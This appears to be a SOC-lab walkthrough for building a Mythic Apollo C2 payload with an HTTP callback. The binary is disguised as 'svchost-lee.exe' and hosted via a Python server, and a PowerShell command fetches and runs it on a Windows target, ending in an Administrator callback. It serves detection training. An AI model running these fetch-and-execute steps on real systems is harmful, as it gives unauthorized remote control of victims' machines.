# Creating a Payload in Mythic

**Complete Step-by-Step Visual Guide**

Apollo + HTTP → Build WinExe → Host → Execute → Callback

| Field | Value |
|-------|-------|
| **Agent** | apollo (Windows .NET) |
| **C2 profile** | http |
| **Output type** | WinExe (svchost-lee.exe) |
| **Callback host** | https://140.82.1.14 (example) |
| **Lab target** | MYDFIR-WIN-JASONLE (Administrator) |

Each of the 11 screenshots appears exactly once. Descriptions match the actual screenshots.

> **Lab use only.** Do not deploy against systems you do not own or lack explicit permission to test.

---

## Table of Contents

1. Configure payload (OS, type, output_type)
2. Select commands to include
3. Select and configure HTTP C2 profile
4. Name the payload and create it
5. Payload appears in Payloads list
6. Download the payload with wget
7. Rename and stage the payload
8. Host the payload with Python HTTP server
9. Download and run on the Windows target
10. Confirm HTTP GET on the host
11. Active callback in Mythic
12. Next steps

---

## 1. Configure payload (OS, type, output_type)

In Mythic go to **Create Payload** (or Payloads).

Select **Operating System: Windows**.

Select **Payload Type: apollo**.

Under Configure Payload Build Parameters set **output_type** to **WinExe**.

Leave debug / keying options as needed, then click **NEXT**.

**Figure 1** – Payload Creation step 2: Windows + apollo + output_type WinExe → NEXT

---

## 2. Select commands to include

On the Select Commands page, choose which Apollo commands to embed (download, exit, ps, shell, etc.).

Use the **>>** button to move commands from Available into the payload.

Click **NEXT** when ready.

**Figure 2** – Select Commands step → move desired commands to “Commands in Payload” → NEXT

---

## 3. Select and configure HTTP C2 profile

On Select C2 Profiles include the **http** profile.

Configure at least:

- **callback_host**: `https://<Mythic-IP>` (example shows `https://140.82.1.14`)
- callback_interval / jitter / port as desired

Click **NEXT**.

**Figure 3** – Select C2 Profiles → include http → set callback_host → NEXT

---

## 4. Name the payload and create it

Provide a payload name (e.g. `svchost-lee.exe`) and description (e.g. `MYDFIR-SOC 30-Day Challenge`). Review the summary, then click **CREATE PAYLOAD**.

**Figure 4** – Build step → name svchost-lee.exe → CREATE PAYLOAD

---

## 5. Payload appears in Payloads list

Open **Payloads** in the sidebar.

The new payload `svchost-lee.exe` is listed with progress indicators and C2 Status showing the http profile.

**Figure 5** – Payloads page showing svchost-lee.exe with C2 Status http

---

## 6. Download the payload with wget

From the Mythic server (or another host) download the built binary.

Use the direct download URL from the Payloads UI (Actions → download), for example:

```bash
wget https://<Mythic-IP>:7443/direct/download/<payload-uuid> --no-check-certificate
```

**Figure 6** – wget https://.../direct/download/<uuid> --no-check-certificate

---

## 7. Rename and stage the payload

Confirm the file type (PE32 executable).

Rename the UUID filename to `svchost-lee.exe`.

Create a staging directory and move the payload into it:

```bash
file <uuid-file>
mv <uuid-file> svchost-lee.exe
mkdir pay
mv svchost-lee.exe pay/
```

**Figure 7** – file / mv to svchost-lee.exe; mkdir pay; mv into pay/

---

## 8. Host the payload with Python HTTP server

From the directory containing the payload start a simple HTTP server so the lab Windows target can download it:

```bash
cd pay
python3 -m http.server 9999
```

**Figure 8** – python3 -m http.server 9999

---

## 9. Download and run on the Windows target

On the Windows lab host (as Administrator) download the payload, e.g.:

```powershell
Invoke-WebRequest -Uri http://<Mythic-IP>:9999/svchost-lee2.exe -OutFile "C:\Users\Public\Downloads\svchost-lee2.exe"
cd C:\Users\Public\Downloads
.\svchost-lee2.exe
```

**Figure 9** – PowerShell Invoke-WebRequest then .\svchost-lee2.exe

---

## 10. Confirm HTTP GET on the host

On the Mythic host the Python HTTP server log shows a successful GET from the Windows target IP (e.g. 66.135.26.132) for the payload file.

**Figure 10** – Python server log shows GET /svchost-lee2.exe 200 from target IP

---

## 11. Active callback in Mythic

Return to Mythic → **Active Callbacks**.

A new callback appears with the target IP, hostname (MYDFIR-WIN-JASONLE), user Administrator, and the description you set on the payload.

Initial access via the Mythic agent is confirmed.

**Figure 11** – Active Callbacks: host MYDFIR-WIN-JASONLE, user Administrator, description MYDFIR_SOC-30DAY-Challenge

---

## 12. Next Steps

- Interact with the callback (shell, download, process list, etc.) for further lab objectives.
- Observe process creation, network connections, and file writes in Sysmon / Elastic.
- Create an osTicket case documenting the “incident” and detection opportunities.
- Practice detection rules for unusual WinExe downloads, new processes, and HTTP beaconing.
- Remove the lab payload and close the callback when finished.

> **Legal / ethical note**: Building and deploying C2 payloads against systems without authorization is illegal. This guide is for isolated SOC lab training only.

---

**End of Guide — Creating a Payload in Mythic**

*Each of the 11 screenshots appears exactly once • Descriptions match the actual screenshots*
